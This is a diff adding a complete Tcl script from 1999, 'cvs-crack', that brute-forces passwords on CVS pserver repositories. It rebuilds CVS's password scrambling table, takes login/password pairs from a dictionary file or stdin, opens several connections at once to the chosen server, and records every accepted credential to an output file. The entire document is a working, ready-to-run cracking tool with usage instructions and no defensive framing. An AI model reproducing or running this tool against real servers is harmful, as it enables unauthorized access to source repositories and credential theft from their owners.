@@ -1,0 +1,277 @@
+#! /usr/bin/tclsh
+# cvs pserver password brute forcer on tclsh by stran9er (25 jun 1999)
+# based on my http-crack
+#
+# ** greetings going to ADM and w00w00 **
+#
+
+if {[package vcompare $tcl_version 7.5] == -1} {
+ puts "Too old tcl version $tcl_version"
+ exit 1
+}
+
+#globals..
+
+set shifts {* cvs password scrambling data *}
+set host {* hostname we connecting to *}
+set port {* port we connecting to *}
+set req  {* requesting file *}
+set dict {* dictionary fileid *}
+set onlyone {* stop after first found *}
+set sockets {* connections in same time *}
+set file_ok {* output filename *}
+set debug {* debug level *}
+set words {* how much l/p pairs read from dictionary *}
+set begin_time {* start time *}
+set lines 0
+
+#some functions..
+
+#init password scrambler, table from cvs-1.10/src/scramble.c
+proc init_scrambler {} {
+global shifts
+ unset shifts
+ set t 0
+ foreach w [split {
+    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
+   16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
+  114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
+  111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
+   41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
+  125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
+   36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
+   58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
+  225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
+  199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
+  174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
+  207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
+  192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
+  227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
+  182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
+  243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152
+ } ", \n"] {
+  if {$w == {}} continue;
+  set shifts([format %c $t]) [format %c $w]
+  incr t
+ }
+ if {$t != 256} {puts "scrambler initialization error"; exit 1}
+}
+
+#scramble password
+proc cvs_scramble str {
+global shifts
+ set s A
+ foreach w [split $str {}] {append s $shifts($w)}
+ return $s
+}
+
+#get "login password" or "login:password" from dictionary (or stdin)
+#return login:pass or {}
+proc get_lp {} {
+global dict words never also
+ if {$never} return
+ if {[info exists also]} {
+  set l $also:$also
+  unset also
+  return $l
+ }
+ while {![eof $dict]} {
+  gets $dict l
+  if {$l != {}} break
+ }
+ if {![info exists l] || $l == {}} return
+ incr words
+ switch -glob -- $l {
+  {* *} {set l [split $l { }]; return [lindex $l 0]:[lindex $l 1]}
+  {*:*} {return $l}
+  default {set also $l; return $l:}
+ }
+}
+
+#tcl error handler
+proc bgerror text {
+global errorInfo
+ puts $errorInfo
+ exit 1
+}
+
+#debug output
+proc putd {level text} {
+global debug
+ if {$level < $debug} {puts "DBG$level: $text"}
+}
+
+#one conection
+proc connect_line {{lp {}}} {
+global host port req lines never
+ incr lines
+ putd 3 "connect_line $lp"
+ if {$lp == {}} {
+  if {[set lp [get_lp]] == {}} {
+   putd 2 "Dictionary end. $lines"
+   incr lines -1
+   if {!$lines} {
+    if {[after info] != {}} {
+     putd 3 "pending events: [after info]"
+     return 1
+    }
+    set never 1
+   }
+   return 1
+  }
+ }
+ set l [lindex [split $lp :] 0]
+ set p [lindex [split $lp :] 1]
+ if {[catch {socket $host $port} s]} {
+  putd 1 "Socket error for \[$lp\]: $s"
+  incr lines -1
+  after 1 [list connect_line $lp]
+ } {
+  fconfigure $s -translation lf
+  putd 1 "trying: :pserver:$l:$p@$host:$port$req"
+  fileevent $s readable [list cvs_reply $s $l $p]
+  fileevent $s writable [list cvs_request $s $l $p]
+ }
+ return 0
+}
+
+#one request
+proc cvs_request {s l p} {
+global req
+ putd 3 writable:$s
+ if {[catch {
+  puts $s "BEGIN AUTH REQUEST\n$req\n$l\n[cvs_scramble $p]\nEND AUTH REQUEST"
+  flush $s
+ } er]} {putd 1 "Write error for $s: $er"}
+ fileevent $s writable {}
+}
+
+#gettin reply
+#I LOVE YOU
+#I HATE YOU
+#E TEXT
+#error CODE TEXT
+#other is illegal, show them
+proc cvs_reply {s l p} {
+global lines
+ putd 3 readable:$s
+ if {[catch {gets $s} a]} {
+  putd 1 "cvs_reply:error:$s:$a"
+  connect_line $l:$p
+ }
+ putd 2 "answer for $l:$p -> $a"
+ switch -glob -- $a {
+  {I HATE YOU} {putd 0 "Valid username for \[$l:$p\] $a"}
+  {I LOVE YOU} {access_granted $l $p}
+  {E *} {
+   set w unknown..
+   while {![eof $s]} {if {[string match error* [set w [gets $s]]]} break}
+   putd 1 "No access: $w"
+  }
+  {error *} {putd 0 "error from server: \[$l:$p\] $a"}
+  default {putd 0 "Illegal reply for \[$l:$p\]: \[$a\]"}
+ }
+ catch {close $s}
+ incr lines -1
+ connect_line
+}
+
+#reply success
+proc access_granted {l p} {
+global req host port file_ok onlyone never
+ switch -- $port 2401 {set po {}} default {set po $port}
+ set url ":pserver:$l@$host:$po$req Password: $p"
+ puts "*** Access Granted *** -> $url"
+ if {[
+  catch {
+   set f [open $file_ok a]
+   puts $f $url
+   close $f
+  } er]} {
+  putd 0 "Can't write $file_ok: $er"
+ }
+ if {$onlyone} {set never 1}
+}
+
+#default values
+init_scrambler
+set onlyone 0
+set debug 0
+set file_ok cvs.ok
+set dict -
+set sockets 1
+set words 0
+set never 0
+
+#parse options
+for {set l 0} {$l < $argc} {incr l} {
+ switch -- [lindex $argv $l] {
+  -d - -debug - debuglevel {set debug [lindex $argv [incr l]]}
+  -i - -dict - -dictfile {set dict [lindex $argv [incr l]]}
+  -1 - -stop - -first - -single - -one {set onlyone 1}
+  -t - -sock - -sockets {set sockets [lindex $argv [incr l]]}
+  -o - -out - -output {set file_ok [lindex $argv [incr l]]}
+  default {
+   if {[info exists url]} {
+    puts "Illegal argument: [lindex $argv $l]"
+    exit 1
+   }
+   set url [lindex $argv $l]
+  }
+ }
+}
+if {$l > $argc} {
+ puts "Incorrect option specified: [lindex $argv [incr l -2]]"
+ exit 1
+}
+
+#little help
+if {![info exist url]} {
+ puts "cvs-crack \[-t #\]\[-stop\] \[-i dictfile\] :pserver:cvs.box.com:/cvsroot"
+ puts " -i dictfile - will try all \"login password\" from dictfile else form stdin"
+ puts "    dictionary format: "
+ puts " login:passwdord - try that"
+ puts " login passwdord - try that"
+ puts " login           - try with login = password, and empty password"
+ puts " -o file - on succes result going to file else to cvs.ok"
+ puts " -1 - stop after first found password"
+ puts " -t # - number of connections"
+ exit 1
+}
+
+#parse url
+regsub -nocase -- ^:pserver: $url {} url
+if {![regexp {^([^/:]*):?([0-9]*|)(/.*|$)$} $url url host port req]} {
+ puts "Can't parse url: $url"
+ exit 1
+}
+if {$host=={}} {set port localhost}
+if {$port=={}} {set port 2401}
+if {$req=={}} {set req /}
+
+putd 3 "\ndict: $dict\nhost: $host\nport: $port\nreq: $req\ndebug: $debug"
+putd 3 "sockets: $sockets\nonlyone: $onlyone\nfile_ok: $file_ok\n"
+
+if {$dict=="-"} {
+ set dict stdin
+} {
+ if {[catch {set dict [open $dict r]} er]} {
+  puts "can't open $dict: $er"
+  exit 1
+ }
+}
+
+set begin_time [clock seconds]
+
+for {set l 0} {$l < $sockets} {incr l} {connect_line}
+
+if {!$never} {
+ putd 3 "event mode"
+ vwait never
+}
+
+set seconds [expr {[clock seconds] - $begin_time}]
+incr seconds
+puts "Done. $words words tried in $seconds seconds, w/s = [expr $words./$seconds.]"
+
+#done
